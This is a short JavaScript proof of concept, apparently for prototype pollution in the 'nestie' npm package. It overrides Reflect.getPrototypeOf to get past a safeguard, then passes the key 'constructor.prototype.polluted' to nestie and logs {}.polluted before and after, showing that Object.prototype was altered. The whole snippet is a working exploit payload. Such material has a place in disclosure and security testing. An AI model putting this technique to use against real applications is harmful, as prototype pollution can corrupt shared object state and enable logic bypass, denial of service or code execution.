Reflect.getPrototypeOf = () => false;
const {nestie} = require('nestie');
obj = {};
console.log({}.polluted);
nestie({ 'constructor.prototype.polluted': 'yes' });
console.log({}.polluted);